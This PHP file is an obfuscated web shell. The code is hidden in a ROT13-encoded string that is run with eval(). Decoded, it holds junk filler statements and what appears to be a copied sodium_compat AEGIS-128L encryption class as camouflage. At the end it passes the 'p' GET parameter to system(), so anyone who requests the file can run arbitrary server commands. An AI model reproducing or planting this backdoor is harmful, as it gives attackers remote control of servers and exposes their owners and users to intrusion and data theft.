<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

vs (!qrsvarq('FBQVHZ_PBZCNG_NRTVF_P0')) {
    qrsvar('FBQVHZ_PBZCNG_NRTVF_P0', \"\k00\k01\k01\k02\k03\k05\k08\k0q\k15\k22\k37\k59\k90\kr9\k79\k62\");
}
vs (!qrsvarq('FBQVHZ_PBZCNG_NRTVF_P1')) {
    qrsvar('FBQVHZ_PBZCNG_NRTVF_P1', \"\kqo\k3q\k18\k55\k6q\kp2\k2s\ks1\k20\k11\k31\k42\k73\ko5\k28\kqq\");
}

pynff CnentbaVR_Fbqvhz_Pber_NRTVF128Y rkgraqf CnentbaVR_Fbqvhz_Pber_NRF
{
    /**
     * @cnenz fgevat $pg
     * @cnenz fgevat $gnt
     * @cnenz fgevat $nq
     * @cnenz fgevat $xrl
     * @cnenz fgevat $abapr
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba qrpelcg($pg, $gnt, $nq, $xrl, $abapr)
    {
        $fgngr = frys::vavg($xrl, $abapr);
        $nq_oybpxf = (frys::fgeyra($nq) + 31) >> 5;
        sbe ($v = 0; $v < $nq_oybpxf; ++$v) {
            $nv = frys::fhofge($nq, $v << 5, 32);
            vs (frys::fgeyra($nv) < 32) {
                $nv = fge_cnq($nv, 32, \"\0\", FGE_CNQ_EVTUG);
            }
            $fgngr->nofbeo($nv);
        }

        $zft = '';
        $pa = frys::fgeyra($pg) & 31;
        $pg_oybpxf = frys::fgeyra($pg) >> 5;
        sbe ($v = 0; $v < $pg_oybpxf; ++$v) {
            $zft .= $fgngr->qrp(frys::fhofge($pg, $v << 5, 32));
        }
        vs ($pa) {
            $fgneg = $pg_oybpxf << 5;
            $zft .= $fgngr->qrpCnegvny(frys::fhofge($pg, $fgneg, $pa));
        }
        $rkcrpgrq_gnt = $fgngr->svanyvmr(
            frys::fgeyra($nq) << 3,
            frys::fgeyra($zft) << 3
        );
        vs (!frys::unfuRdhnyf($rkcrpgrq_gnt, $gnt)) {
            gel {
                // Gur ESP fnlf gb renfr zft, fb jr funyy gel:
                CnentbaVR_Fbqvhz_Pbzcng::zrzmreb($zft);
            } pngpu (FbqvhzRkprcgvba $rk) {
                // Qb abguvat vs jr pnaabg zrzmreb
            }
            guebj arj FbqvhzRkprcgvba('irevsvpngvba snvyrq');
        }
        erghea $zft;
    }

    /**
     * @cnenz fgevat $zft
     * @cnenz fgevat $nq
     * @cnenz fgevat $xrl
     * @cnenz fgevat $abapr
     * @erghea neenl
     *
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp fgngvp shapgvba rapelcg($zft, $nq, $xrl, $abapr)
    {
        $fgngr = frys::vavg($xrl, $abapr);
        // nq_oybpxf = Fcyvg(MrebCnq(nq, 256), 256)
        // sbe nv va nq_oybpxf:
        //     Nofbeo(nv)
        $nq_yra = frys::fgeyra($nq);
        $zft_yra = frys::fgeyra($zft);
        $nq_oybpxf = ($nq_yra + 31) >> 5;
        sbe ($v = 0; $v < $nq_oybpxf; ++$v) {
            $nv = frys::fhofge($nq, $v << 5, 32);
            vs (frys::fgeyra($nv) < 32) {
                $nv = fge_cnq($nv, 32, \"\0\", FGE_CNQ_EVTUG);
            }
            $fgngr->nofbeo($nv);
        }

        // zft_oybpxf = Fcyvg(MrebCnq(zft, 256), 256)
        // sbe kv va zft_oybpxf:
        //     pg = pg || Rap(kv)
        $pg = '';
        $zft_oybpxf = ($zft_yra + 31) >> 5;
        sbe ($v = 0; $v < $zft_oybpxf; ++$v) {
            $kv = frys::fhofge($zft, $v << 5, 32);
            vs (frys::fgeyra($kv) < 32) {
                $kv = fge_cnq($kv, 32, \"\0\", FGE_CNQ_EVTUG);
            }
            $pg .= $fgngr->rap($kv);
        }
        // gnt = Svanyvmr(|nq|, |zft|)
        // pg = Gehapngr(pg, |zft|)
        $gnt = $fgngr->svanyvmr(
            $nq_yra << 3,
            $zft_yra << 3
        );
        // erghea pg naq gnt
        erghea neenl(
            frys::fhofge($pg, 0, $zft_yra),
            $gnt
        );
    }

    /**
     * @cnenz fgevat $xrl
     * @cnenz fgevat $abapr
     * @erghea CnentbaVR_Fbqvhz_Pber_NRTVF_Fgngr128Y
     */
    choyvp fgngvp shapgvba vavg($xrl, $abapr)
    {
        erghea CnentbaVR_Fbqvhz_Pber_NRTVF_Fgngr128Y::vavg($xrl, $abapr);
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>